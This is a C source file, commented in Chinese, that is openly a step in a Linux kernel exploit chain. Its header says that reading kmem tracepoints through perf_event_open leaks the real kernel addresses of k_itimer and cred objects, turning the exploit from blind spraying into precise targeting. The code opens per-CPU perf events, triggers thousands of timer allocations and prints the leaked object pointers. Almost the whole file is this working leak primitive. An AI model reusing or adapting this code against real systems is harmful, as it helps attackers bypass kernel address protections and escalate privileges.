// 通过 perf 读取 kmem tracepoint —— 拿到 kmem_cache_alloc 的**对象地址**
//
// 背景：
//   tracefs 的 kmem 事件 enable 是 0644 root:root，shell 写不了；
//   但 perf_event_open(PERF_TYPE_TRACEPOINT, id) 走的是另一条路。
//   一旦能开，就能直接读到 k_itimer / cred 的真实内核地址，
//   整个利用链从「盲喷」变成「精确定点」。
//
// 用法：kmem_perf [事件名] [秒数]
//   事件名默认 kmem_cache_alloc
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>
#include <linux/perf_event.h>

#define TRACE "/sys/kernel/tracing/events"

static int read_int_file(const char *path)
{
	char buf[64];
	int fd = open(path, O_RDONLY);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	buf[n] = 0;
	return atoi(buf);
}

/* 从 format 文件里取某个字段的 offset:size */
static int field_layout(const char *ev, const char *field, int *off, int *size)
{
	char path[256];
	char line[256];
	FILE *f;

	snprintf(path, sizeof(path), TRACE "/%s/format", ev);
	f = fopen(path, "r");
	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char *p = strstr(line, field);

		if (p && strstr(line, "offset:")) {
			char *o = strstr(line, "offset:");
			char *s = strstr(line, "size:");

			if (o && s) {
				*off = atoi(o + 7);
				*size = atoi(s + 5);
				fclose(f);
				return 0;
			}
		}
	}
	fclose(f);
	return -1;
}

static int perf_event_open_tp(int tp_id, int cpu)
{
	struct perf_event_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.type = PERF_TYPE_TRACEPOINT;
	attr.size = sizeof(attr);
	attr.config = (uint64_t)tp_id;
	attr.sample_period = 1;
	attr.sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TID;
	attr.wakeup_events = 1;
	return (int)syscall(SYS_perf_event_open, &attr, -1, cpu, -1, 0);
}

int main(int argc, char **argv)
{
	const char *ev = (argc > 1) ? argv[1] : "kmem/kmem_cache_alloc";
	int secs = (argc > 2) ? atoi(argv[2]) : 2;
	char p[256];
	int tp_id, ptr_off = -1, ptr_sz = 0, cs_off = -1, cs_sz = 0;

	snprintf(p, sizeof(p), TRACE "/%s/id", ev);
	tp_id = read_int_file(p);
	printf("事件 %s id=%d errno=%d\n", ev, tp_id, errno);
	if (tp_id < 0) {
		printf("  读不到 id（可能被 SELinux / 权限挡住）\n");
		return 1;
	}
	if (field_layout(ev, "ptr;", &ptr_off, &ptr_sz))
		printf("  format 里没有 ptr 字段（事件可能不同）\n");
	(void)field_layout(ev, "call_site;", &cs_off, &cs_sz);
	printf("  ptr offset=%d size=%d | call_site offset=%d size=%d\n",
	       ptr_off, ptr_sz, cs_off, cs_sz);

	int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
	int fds[16];
	int nfd = 0;

	for (int c = 0; c < ncpu && c < 16; c++) {
		int fd = perf_event_open_tp(tp_id, c);

		printf("  perf_event_open(cpu%d) -> %d errno=%d(%s)\n", c, fd, errno,
		       strerror(errno));
		if (fd >= 0) {
			ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
			fds[nfd++] = fd;
		}
	}
	if (!nfd) {
		printf("全部失败：perf 路不通\n");
		return 2;
	}
	/* mmap 环缓冲 */
	size_t pg = (size_t)sysconf(_SC_PAGESIZE);
	size_t len = pg * 9;
	void *rings[16];
	int nring = 0;

	for (int i = 0; i < nfd; i++) {
		void *r = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fds[i], 0);

		if (r != MAP_FAILED)
			rings[nring++] = r;
	}
	printf("  mmap 了 %d 个环\n", nring);

	/* 制造受监控的分配：建一堆 timer 和 pipe */
	for (int i = 0; i < 2000; i++) {
		timer_t t;
		struct sigevent e;

		memset(&e, 0, sizeof(e));
		e.sigev_notify = SIGEV_NONE;
		timer_create(CLOCK_MONOTONIC, &e, &t);
	}
	int pp[2];

	if (pipe(pp) == 0)
		(void)!write(pp[1], "A", 1);

	struct timespec ts = { .tv_sec = secs };

	nanosleep(&ts, NULL);

	/* 解析环缓冲：只关心 PERF_RECORD_SAMPLE 的 RAW */
	int hits = 0;

	for (int i = 0; i < nring; i++) {
		struct perf_event_mmap_page *meta = rings[i];
		uint64_t head = meta->data_head;
		uint64_t tail = meta->data_tail;
		unsigned char *data = (unsigned char *)meta + pg;
		size_t dsize = pg * 8;

		__sync_synchronize();
		while (tail < head && hits < 40) {
			struct perf_event_header *h = (void *)(data + (tail % dsize));

			if (h->size == 0 || h->size > dsize)
				break;
			if (h->type == PERF_RECORD_SAMPLE) {
				unsigned char *rec = (unsigned char *)h;
				size_t pos = sizeof(*h);
				/* 顺序与 sample_type 一致：TID 然后 RAW */
				uint32_t pid = 0, tid = 0;
				uint32_t rawsz = 0;

				if (pos + 8 <= h->size) {
					memcpy(&pid, rec + pos, 4);
					memcpy(&tid, rec + pos + 4, 4);
					pos += 8;
				}
				if (pos + 4 <= h->size) {
					memcpy(&rawsz, rec + pos, 4);
					pos += 4;
					if (ptr_off >= 0 && pos + rawsz <= h->size &&
					    (size_t)ptr_off + 8 <= rawsz) {
						uint64_t v;

						memcpy(&v, rec + pos + ptr_off, 8);
						printf("    pid=%u ptr=0x%016llx\n", pid,
						       (unsigned long long)v);
						hits++;
					}
				}
			}
			tail += h->size;
		}
		meta->data_tail = head;
	}
	printf("共解析 %d 条分配记录\n", hits);
	for (int i = 0; i < nfd; i++) {
		ioctl(fds[i], PERF_EVENT_IOC_DISABLE, 0);
		close(fds[i]);
	}
	return hits > 0 ? 0 : 3;
}
